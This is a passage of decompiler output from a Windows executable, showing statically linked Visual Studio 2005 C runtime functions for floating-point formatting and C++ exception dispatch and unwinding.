    else {
      _SizeInBytes = param_3 - (uint)(local_30.sign == 0x2d);
    }
    eVar2 = __fptostr(param_2 + (local_30.sign == 0x2d),_SizeInBytes,local_30.decpt + param_4,
                      &local_30);
    if (eVar2 == 0) {
      __cftof2_l(param_2,param_3,param_4,'\0',param_5);
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cftog_l
// 
// Library: Visual Studio 2005 Release

void __cdecl
__cftog_l(double *param_1,undefined *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  char *pcVar1;
  int *piVar2;
  errno_t eVar3;
  size_t _SizeInBytes;
  char *pcVar4;
  _strflt local_34;
  int local_24;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_34,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    local_24 = local_34.decpt + -1;
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - (local_34.sign == 0x2d);
    }
    eVar3 = __fptostr(param_2 + (local_34.sign == 0x2d),_SizeInBytes,param_4,&local_34);
    if (eVar3 == 0) {
      local_34.decpt = local_34.decpt + -1;
      if ((local_34.decpt < -4) || ((int)param_4 <= local_34.decpt)) {
        __cftoe2_l(param_3,param_4,param_5,&local_34.sign,'\x01',param_6);
      }
      else {
        pcVar1 = param_2 + (local_34.sign == 0x2d);
        if (local_24 < local_34.decpt) {
          do {
            pcVar4 = pcVar1;
            pcVar1 = pcVar4 + 1;
          } while (*pcVar4 != '\0');
          pcVar4[-1] = '\0';
        }
        __cftof2_l(param_2,param_3,param_4,'\x01',param_6);
      }
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cfltcvt_l
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl
__cfltcvt_l(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps,
           _locale_t plocinfo)

{
  errno_t eVar1;
  
  if ((format == 0x65) || (format == 0x45)) {
    eVar1 = __cftoe_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
  }
  else {
    if (format == 0x66) {
      eVar1 = __cftof_l(arg,buffer,sizeInBytes,precision,plocinfo);
      return eVar1;
    }
    if ((format == 0x61) || (format == 0x41)) {
      eVar1 = __cftoa_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
    else {
      eVar1 = __cftog_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
  }
  return eVar1;
}



// Library Function - Single Match
//  __cfltcvt
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release,
// Visual Studio 2012 Release

errno_t __cdecl
__cfltcvt(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps)

{
  errno_t eVar1;
  
  eVar1 = __cfltcvt_l(arg,buffer,sizeInBytes,format,precision,caps,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __setdefaultprecision
// 
// Library: Visual Studio 2005 Release

void __setdefaultprecision(void)

{
  errno_t eVar1;
  
  eVar1 = __controlfp_s((uint *)0x0,0x10000,0x30000);
  if (eVar1 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __ms_p5_test_fdiv
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 __ms_p5_test_fdiv(void)

{
  double dVar1;
  
  dVar1 = _DAT_0041fff0 - (_DAT_0041fff0 / _DAT_0041fff8) * _DAT_0041fff8;
  if (1.0 < dVar1 != NAN(dVar1)) {
    return 1;
  }
  return 0;
}



// Library Function - Single Match
//  __ms_p5_mp_test_fdiv
// 
// Library: Visual Studio 2005 Release

void __ms_p5_mp_test_fdiv(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleA(s_KERNEL32_0042001c);
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_GAIsProcessorFeaturePresent_0041fffe + 2);
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(0);
      return;
    }
  }
  __ms_p5_test_fdiv();
  return;
}



undefined4 * __thiscall FUN_00418819(void *this,byte param_1)

{
  *(undefined **)this = &DAT_00420030;
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    _free(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___TypeMatch
// 
// Library: Visual Studio 2005 Release

undefined4 __cdecl ___TypeMatch(byte *param_1,byte *param_2,uint *param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((iVar1 == 0) || (*(char *)(iVar1 + 8) == '\0')) {
LAB_00418891:
    uVar2 = 1;
  }
  else {
    if (iVar1 == *(int *)(param_2 + 4)) {
LAB_0041886f:
      if (((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&
          (((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)))) &&
         (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))) goto LAB_00418891;
    }
    else {
      iVar1 = _strcmp((char *)(iVar1 + 8),(char *)(*(int *)(param_2 + 4) + 8));
      if (iVar1 == 0) goto LAB_0041886f;
    }
    uVar2 = 0;
  }
  return uVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___FrameUnwindToState
// 
// Library: Visual Studio 2005 Release

void __cdecl ___FrameUnwindToState(int param_1,undefined4 param_2,int param_3,int param_4)

{
  _ptiddata p_Var1;
  int iVar2;
  int *piVar3;
  int iVar4;
  
  if (*(int *)(param_3 + 4) < 0x81) {
    iVar4 = (int)*(char *)(param_1 + 8);
  }
  else {
    iVar4 = *(int *)(param_1 + 8);
  }
  p_Var1 = __getptd();
  p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + 1;
  while (iVar4 != param_4) {
    if ((iVar4 < 0) || (*(int *)(param_3 + 4) <= iVar4)) {
      _inconsistency();
    }
    iVar2 = iVar4 * 8;
    piVar3 = (int *)(*(int *)(param_3 + 8) + iVar2);
    iVar4 = *piVar3;
    if (piVar3[1] != 0) {
      *(int *)(param_1 + 8) = iVar4;
      __CallSettingFrame_12(*(undefined4 *)(*(int *)(param_3 + 8) + 4 + iVar2),param_1,0x103);
    }
  }
  FUN_004189a1();
  if (iVar4 != param_4) {
    _inconsistency();
  }
  *(int *)(param_1 + 8) = iVar4;
  return;
}



void FUN_004189a1(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (0 < p_Var1->_ProcessingThrow) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___DestructExceptionObject
// 
// Library: Visual Studio 2005 Release

void __cdecl ___DestructExceptionObject(int *param_1)

{
  undefined *UNRECOVERED_JUMPTABLE;
  
  if ((((param_1 != (int *)0x0) && (*param_1 == -0x1f928c9d)) && (param_1[7] != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(undefined **)(param_1[7] + 4),
     UNRECOVERED_JUMPTABLE != (undefined *)0x0)) {
    FID_conflict__CallMemberFunction1(param_1[6],UNRECOVERED_JUMPTABLE);
  }
  return;
}



// Library Function - Single Match
//  ___AdjustPointer
// 
// Library: Visual Studio 2005 Release

int __cdecl ___AdjustPointer(int param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = *param_2 + param_1;
  if (-1 < param_2[1]) {
    iVar1 = iVar1 + *(int *)(*(int *)(param_2[1] + param_1) + param_2[2]) + param_2[1];
  }
  return iVar1;
}



// Library Function - Single Match
//  unsigned char __cdecl IsInExceptionSpec(struct EHExceptionRecord *,struct _s_ESTypeList const *)
// 
// Library: Visual Studio 2005 Release

uchar __cdecl IsInExceptionSpec(EHExceptionRecord *param_1,_s_ESTypeList *param_2)

{
  uchar in_AL;
  int iVar1;
  byte *pbVar2;
  byte **ppbVar3;
  int *unaff_EDI;
  int local_c;
  uchar local_5;
  
  if (unaff_EDI == (int *)0x0) {
    _inconsistency();
    terminate();
    return in_AL;
  }
  local_c = 0;
  local_5 = '\0';
  if (0 < *unaff_EDI) {
    do {
      ppbVar3 = *(byte ***)(*(int *)(param_1 + 0x1c) + 0xc);
      pbVar2 = *ppbVar3;
      if (0 < (int)pbVar2) {
        do {
          ppbVar3 = ppbVar3 + 1;
          iVar1 = ___TypeMatch((byte *)(unaff_EDI[1] + local_c * 0x10),*ppbVar3,
                               *(uint **)(param_1 + 0x1c));
          if (iVar1 != 0) {
            local_5 = '\x01';
            break;
          }
          pbVar2 = pbVar2 + -1;
        } while (0 < (int)pbVar2);
      }
      local_c = local_c + 1;
    } while (local_c < *unaff_EDI);
  }
  return local_5;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3
// Library Function - Single Match
//  void __cdecl CallUnexpected(struct _s_ESTypeList const *)
// 
// Library: Visual Studio 2005 Release

void __cdecl CallUnexpected(_s_ESTypeList *param_1)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (p_Var1->_curexcspec != (void *)0x0) {
    _inconsistency();
  }
  unexpected();
  terminate();
  return;
}



void Catch_All_00418b24(void)

{
  code *pcVar1;
  _ptiddata p_Var2;
  int unaff_EBP;
  
  p_Var2 = __getptd();
  p_Var2->_curexcspec = *(void **)(unaff_EBP + 8);
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  void * __cdecl CallCatchBlock(struct EHExceptionRecord *,struct EHRegistrationNode *,struct
// _CONTEXT *,struct _s_FuncInfo const *,void *,int,unsigned long)
// 
// Library: Visual Studio 2005 Release

void * __cdecl
CallCatchBlock(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,
              _s_FuncInfo *param_4,void *param_5,int param_6,ulong param_7)

{
  _ptiddata p_Var1;
  void *in_ECX;
  undefined4 local_40 [2];
  undefined4 local_38;
  void *local_34;
  void *local_30;
  undefined4 *local_2c;
  undefined4 local_28;
  void *local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00420898;
  uStack_c = 0x418b48;
  local_38 = 0;
  local_28 = *(undefined4 *)(param_2 + -4);
  local_2c = __CreateFrameInfo(local_40,*(undefined4 *)(param_1 + 0x18));
  p_Var1 = __getptd();
  local_30 = p_Var1->_curexception;
  p_Var1 = __getptd();
  local_34 = p_Var1->_curcontext;
  p_Var1 = __getptd();
  p_Var1->_curexception = param_1;
  p_Var1 = __getptd();
  p_Var1->_curcontext = param_3;
  local_8 = (undefined *)0x1;
  local_20 = _CallCatchBlock2(param_2,param_4,in_ECX,(int)param_5,param_6);
  local_8 = (undefined *)0xfffffffe;
  FUN_00418c62();
  return local_20;
}



void FUN_00418c62(void)

{
  _ptiddata p_Var1;
  int iVar2;
  int unaff_EBP;
  int *unaff_ESI;
  int unaff_EDI;
  
  *(undefined4 *)(unaff_EDI + -4) = *(undefined4 *)(unaff_EBP + -0x24);
  __FindAndUnlinkFrame(*(void **)(unaff_EBP + -0x28));
  p_Var1 = __getptd();
  p_Var1->_curexception = *(void **)(unaff_EBP + -0x2c);
  p_Var1 = __getptd();
  p_Var1->_curcontext = *(void **)(unaff_EBP + -0x30);
  if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&
      ((iVar2 = unaff_ESI[5], iVar2 == 0x19930520 ||
       ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))) &&
     ((*(int *)(unaff_EBP + -0x34) == 0 && (*(int *)(unaff_EBP + -0x1c) != 0)))) {
    iVar2 = __IsExceptionObjectToBeDestroyed(unaff_ESI[6]);
    if (iVar2 != 0) {
      ___DestructExceptionObject(unaff_ESI);
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObjectHelper
// 
// Library: Visual Studio 2005 Release

char __cdecl ___BuildCatchObjectHelper(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  int iVar1;
  void *pvVar2;
  size_t _Size;
  uint in_stack_ffffffd0;
  
  if (((param_3[1] == 0) || (*(char *)(param_3[1] + 8) == '\0')) ||
     ((param_3[2] == 0 && ((*param_3 & 0x80000000) == 0)))) {
    return '\0';
  }
  if (-1 < (int)*param_3) {
    param_2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  if ((*param_3 & 8) == 0) {
    pvVar2 = *(void **)(param_1 + 0x18);
    if ((*param_4 & 1) == 0) {
      if (*(int *)(param_4 + 0x18) == 0) {
        iVar1 = _ValidateRead(pvVar2,1);
        if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
          _Size = *(size_t *)(param_4 + 0x14);
          pvVar2 = (void *)___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
          _memmove(param_2,pvVar2,_Size);
          return '\0';
        }
      }
      else {
        iVar1 = _ValidateRead(pvVar2,1);
        if (((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) &&
           (iVar1 = _ValidateRead(*(void **)(param_4 + 0x18),in_stack_ffffffd0), iVar1 != 0)) {
          return ((*param_4 & 4) != 0) + '\x01';
        }
      }
    }
    else {
      iVar1 = _ValidateRead(pvVar2,1);
      if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
        _memmove(param_2,*(void **)(param_1 + 0x18),*(size_t *)(param_4 + 0x14));
        if (*(int *)(param_4 + 0x14) != 4) {
          return '\0';
        }
        iVar1 = *param_2;
        if (iVar1 == 0) {
          return '\0';
        }
        goto LAB_00418d5d;
      }
    }
  }
  else {
    iVar1 = _ValidateRead(*(void **)(param_1 + 0x18),1);
    if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
      iVar1 = *(int *)(param_1 + 0x18);
      *param_2 = iVar1;
LAB_00418d5d:
      iVar1 = ___AdjustPointer(iVar1,(int *)(param_4 + 8));
      *param_2 = iVar1;
      return '\0';
    }
  }
  _inconsistency();
  return '\0';
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObject
// 
// Library: Visual Studio 2005 Release

void __cdecl ___BuildCatchObject(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  char cVar1;
  undefined3 extraout_var;
  int *piVar2;
  
  piVar2 = param_2;
  if ((*param_3 & 0x80000000) == 0) {
    piVar2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  cVar1 = ___BuildCatchObjectHelper(param_1,param_2,param_3,param_4);
  if (CONCAT31(extraout_var,cVar1) == 1) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  else if (CONCAT31(extraout_var,cVar1) == 2) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  return;
}



// Library Function - Single Match
//  void __cdecl CatchIt(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,struct _s_HandlerType const *,struct _s_CatchableType const
// *,struct _s_TryBlockMapEntry const *,int,struct EHRegistrationNode *,unsigned char)
// 
// Library: Visual Studio 2005 Release

void __cdecl
CatchIt(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
       _s_FuncInfo *param_5,_s_HandlerType *param_6,_s_CatchableType *param_7,
       _s_TryBlockMapEntry *param_8,int param_9,EHRegistrationNode *param_10,uchar param_11)

{
  void *pvVar1;
  uint *unaff_EBX;
  int *unaff_ESI;
  int *unaff_EDI;
  int *piVar2;
  
  if (param_5 != (_s_FuncInfo *)0x0) {
    ___BuildCatchObject((int)param_1,unaff_ESI,unaff_EBX,(byte *)param_5);
  }
  if (param_7 == (_s_CatchableType *)0x0) {
    param_7 = (_s_CatchableType *)unaff_ESI;
  }
  _UnwindNestedFrames((EHRegistrationNode *)param_7,param_1);
  piVar2 = unaff_ESI;
  ___FrameUnwindToState((int)unaff_ESI,param_3,(int)param_4,*unaff_EDI);
  unaff_ESI[2] = unaff_EDI[1] + 1;
  pvVar1 = CallCatchBlock(param_1,(EHRegistrationNode *)unaff_ESI,(_CONTEXT *)param_2,
                          (_s_FuncInfo *)param_4,param_6,0x100,(ulong)piVar2);
  if (pvVar1 != (void *)0x0) {
    _JumpToContinuation(pvVar1,(EHRegistrationNode *)unaff_ESI);
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandlerForForeignException(struct EHExceptionRecord *,struct EHRegistrationNode
// *,struct _CONTEXT *,void *,struct _s_FuncInfo const *,int,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2005 Release

void __cdecl
FindHandlerForForeignException
          (EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,int param_7,EHRegistrationNode *param_8)

{
  TypeDescriptor *pTVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  int iVar4;
  _s_TryBlockMapEntry *p_Var5;
  _s_TryBlockMapEntry *unaff_EBX;
  EHRegistrationNode *unaff_ESI;
  int unaff_EDI;
  uint extraout_var;
  uint uVar6;
  uint local_8;
  
  if (*(int *)param_1 != -0x7ffffffd) {
    p_Var2 = __getptd();
    uVar6 = extraout_var;
    if (p_Var2->_translator != (void *)0x0) {
      p_Var2 = __getptd();
      pvVar3 = (void *)__encoded_null();
      if (((p_Var2->_translator != pvVar3) && (*(int *)param_1 != -0x1fbcb0b3)) &&
         (iVar4 = _CallSETranslator(param_1,param_2,param_3,param_4,param_5,param_7,param_8),
         iVar4 != 0)) {
        return;
      }
    }
    if (param_5->nTryBlocks == 0) {
      _inconsistency();
    }
    p_Var5 = _GetRangeOfTrysToCheck(param_5,param_7,param_6,&local_8,(uint *)&stack0xfffffff4);
    if (local_8 < uVar6) {
      do {
        if ((p_Var5->tryLow <= param_6) && (param_6 <= p_Var5->tryHigh)) {
          pTVar1 = p_Var5->pHandlerArray[p_Var5->nCatches + -1].pType;
          if (((pTVar1 == (TypeDescriptor *)0x0) || (*(char *)&pTVar1[1].hash == '\0')) &&
             ((*(byte *)&p_Var5->pHandlerArray[p_Var5->nCatches + -1].adjectives & 0x40) == 0)) {
            CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,
                    (_s_FuncInfo *)0x0,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,
                    unaff_EBX,unaff_EDI,unaff_ESI,(uchar)uVar6);
          }
        }
        local_8 = local_8 + 1;
        p_Var5 = p_Var5 + 1;
      } while (local_8 < uVar6);
    }
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandler(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,unsigned char,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2005 Release

void __cdecl
FindHandler(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
           _s_FuncInfo *param_5,uchar param_6,int param_7,EHRegistrationNode *param_8)

{
  uint uVar1;
  int *piVar2;
  uchar uVar3;
  bool bVar4;
  _ptiddata p_Var5;
  int iVar6;
  _s_TryBlockMapEntry *p_Var7;
  EHRegistrationNode *unaff_EBX;
  uint uVar8;
  HandlerType *pHVar9;
  _s_FuncInfo *p_Var10;
  int unaff_ESI;
  _s_FuncInfo *p_Var11;
  _s_TryBlockMapEntry *unaff_EDI;
  EHRegistrationNode *pEVar12;
  undefined *in_stack_ffffffd0;
  uint local_20;
  int local_1c;
  uint local_18;
  uint local_14;
  HandlerType *local_10;
  int local_c;
  char local_5;
  
  p_Var10 = param_5;
  local_5 = '\0';
  if (param_5->maxState < 0x81) {
    local_c = (int)(char)param_2[8];
  }
  else {
    local_c = *(int *)(param_2 + 8);
  }
  if ((local_c < -1) || (param_5->maxState <= local_c)) {
    _inconsistency();
  }
  p_Var11 = (_s_FuncInfo *)param_1;
  if (*(int *)param_1 == -0x1f928c9d) {
    uVar8 = 0x19930520;
    if (((*(int *)(param_1 + 0x10) == 3) &&
        (((iVar6 = *(int *)(param_1 + 0x14), iVar6 == 0x19930520 || (iVar6 == 0x19930521)) ||
         (iVar6 == 0x19930522)))) && (*(int *)(param_1 + 0x1c) == 0)) {
      p_Var5 = __getptd();
      if (p_Var5->_curexception == (void *)0x0) {
        return;
      }
      p_Var5 = __getptd();
      p_Var11 = (_s_FuncInfo *)p_Var5->_curexception;
      param_1 = (EHExceptionRecord *)p_Var11;
      p_Var5 = __getptd();
      param_3 = (_CONTEXT *)p_Var5->_curcontext;
      iVar6 = _ValidateRead(p_Var11,1);
      if (iVar6 == 0) {
        _inconsistency();
      }
      if ((((p_Var11->magicNumber_and_bbtFlags == 0xe06d7363) &&
           (p_Var11->pTryBlockMap == (TryBlockMapEntry *)0x3)) &&
          ((uVar1 = p_Var11->nIPMapEntries, uVar1 == 0x19930520 ||
           ((uVar1 == 0x19930521 || (uVar1 == 0x19930522)))))) &&
         (p_Var11->pESTypeList == (ESTypeList *)0x0)) {
        _inconsistency();
      }
      p_Var5 = __getptd();
      if (p_Var5->_curexcspec != (void *)0x0) {
        p_Var5 = __getptd();
        piVar2 = (int *)p_Var5->_curexcspec;
        p_Var5 = __getptd();
        iVar6 = 0;
        p_Var5->_curexcspec = (void *)0x0;
        uVar3 = IsInExceptionSpec(param_1,(_s_ESTypeList *)unaff_EDI);
        p_Var11 = (_s_FuncInfo *)param_1;
        if (uVar3 == '\0') {
          uVar8 = 0;
          if (0 < *piVar2) {
            do {
              bVar4 = type_info::operator==
                                (*(type_info **)(uVar8 + 4 + piVar2[1]),(type_info *)&DAT_004236c8);
              if (bVar4) {
                ___DestructExceptionObject((int *)param_1);
                param_1 = (EHExceptionRecord *)s_bad_exception_00420038;
                std::exception::exception((exception *)&stack0xffffffd0,(char **)&param_1);
                in_stack_ffffffd0 = &DAT_00420030;
                __CxxThrowException_8(&stack0xffffffd0,&DAT_004208fc);
                p_Var11 = (_s_FuncInfo *)param_1;
                goto LAB_004191c5;
              }
              iVar6 = iVar6 + 1;
              uVar8 = uVar8 + 0x10;
            } while (iVar6 < *piVar2);
          }
          goto LAB_00419184;
        }
      }
    }
LAB_004191c5:
    p_Var10 = param_5;
    if (((p_Var11->magicNumber_and_bbtFlags == 0xe06d7363) &&
        (p_Var11->pTryBlockMap == (TryBlockMapEntry *)0x3)) &&
       ((uVar1 = p_Var11->nIPMapEntries, uVar1 == uVar8 ||
        ((uVar1 == 0x19930521 || (uVar1 == 0x19930522)))))) {
      if (param_5->nTryBlocks != 0) {
        p_Var7 = _GetRangeOfTrysToCheck(param_5,param_7,local_c,&local_14,&local_20);
        for (; local_14 < local_20; local_14 = local_14 + 1) {
          if ((p_Var7->tryLow <= local_c) && (local_c <= p_Var7->tryHigh)) {
            local_10 = p_Var7->pHandlerArray;
            for (local_1c = p_Var7->nCatches; 0 < local_1c; local_1c = local_1c + -1) {
              pHVar9 = p_Var11->pESTypeList[1].pTypeArray;
              for (local_18 = pHVar9->adjectives; 0 < (int)local_18; local_18 = local_18 - 1) {
                pHVar9 = (HandlerType *)&pHVar9->pType;
                p_Var10 = *(_s_FuncInfo **)pHVar9;
                iVar6 = ___TypeMatch((byte *)local_10,(byte *)p_Var10,(uint *)p_Var11->pESTypeList);
                if (iVar6 != 0) {
                  local_5 = '\x01';
                  CatchIt((EHExceptionRecord *)p_Var11,(EHRegistrationNode *)param_3,
                          (_CONTEXT *)param_4,param_5,p_Var10,(_s_HandlerType *)param_7,
                          (_s_CatchableType *)param_8,unaff_EDI,unaff_ESI,unaff_EBX,
                          (uchar)SUB41(in_stack_ffffffd0,0));
                  p_Var11 = (_s_FuncInfo *)param_1;
                  goto LAB_004192ae;
                }
              }
              local_10 = local_10 + 1;
            }
          }
LAB_004192ae:
          p_Var7 = p_Var7 + 1;
        }
      }
      p_Var10 = param_5;
      if (param_6 != '\0') {
        ___DestructExceptionObject((int *)p_Var11);
      }
      if ((((local_5 != '\0') || ((p_Var10->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930521)) ||
          (p_Var10->pESTypeList == (ESTypeList *)0x0)) ||
         (uVar3 = IsInExceptionSpec((EHExceptionRecord *)p_Var11,(_s_ESTypeList *)unaff_EDI),
         uVar3 != '\0')) goto LAB_00419384;
      __getptd();
      __getptd();
      p_Var5 = __getptd();
      p_Var5->_curexception = p_Var11;
      p_Var5 = __getptd();
      p_Var5->_curcontext = param_3;
      pEVar12 = param_8;
      if (param_8 == (EHRegistrationNode *)0x0) {
        pEVar12 = param_2;
      }
      _UnwindNestedFrames(pEVar12,(EHExceptionRecord *)p_Var11);
      p_Var11 = param_5;
      ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
      CallUnexpected(p_Var11->pESTypeList);
      p_Var10 = param_5;
    }
  }
  if (p_Var10->nTryBlocks != 0) {
    if (param_6 != '\0') {
LAB_00419184:
      terminate();
      return;
    }
    FindHandlerForForeignException
              ((EHExceptionRecord *)p_Var11,param_2,param_3,param_4,p_Var10,local_c,param_7,param_8)
    ;
  }
LAB_00419384:
  p_Var5 = __getptd();
  if (p_Var5->_curexcspec != (void *)0x0) {
    _inconsistency();
  }
  return;
}



// Library Function - Single Match
//  ___InternalCxxFrameHandler
// 
// Library: Visual Studio 2005 Release

undefined4 __cdecl
___InternalCxxFrameHandler
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7,uchar param_8)

{
  _ptiddata p_Var1;
  undefined4 uVar2;
  
  p_Var1 = __getptd();
  if ((((*(int *)((p_Var1->_setloc_data)._cacheout + 0x27) != 0) || (*param_1 == -0x1f928c9d)) ||
      (*param_1 == -0x7fffffda)) ||
     (((param_5->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930522 ||
      ((*(byte *)&param_5->EHFlags & 1) == 0)))) {
    if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
      if ((param_5->nTryBlocks != 0) ||
         ((0x19930520 < (param_5->magicNumber_and_bbtFlags & 0x1fffffff) &&
          (param_5->pESTypeList != (ESTypeList *)0x0)))) {
        if ((*param_1 == -0x1f928c9d) &&
           (((2 < (uint)param_1[4] && (0x19930522 < (uint)param_1[5])) &&
            (*(code **)(param_1[7] + 8) != (code *)0x0)))) {
          uVar2 = (**(code **)(param_1[7] + 8))
                            (param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
          return uVar2;
        }
        FindHandler((EHExceptionRecord *)param_1,param_2,param_3,param_4,param_5,param_8,param_6,
                    param_7);
      }
    }
    else if ((param_5->maxState != 0) && (param_6 == 0)) {
      ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
    }
  }
  return 1;
}



// WARNING: Restarted to delay deadcode elimination for space: stack
// Library Function - Single Match
//  __CallSettingFrame@12
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __CallSettingFrame_12(undefined4 param_1,undefined4 param_2,int param_3)

{
  code *pcVar1;
  
  pcVar1 = (code *)__NLG_Notify1(param_3);
  (*pcVar1)();
  if (param_3 == 0x100) {
    param_3 = 2;
  }
  __NLG_Notify1(param_3);
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2005 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  _LocaleUpdate local_28 [8];
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate(local_28,_Locale);
  local_18 = FUN_0041a463((undefined2 *)&local_14,&local_2c,_Str,0,0,0,0,(int)local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_00419543:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_00419583;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_00419575:
      if (local_1c != '\0') {
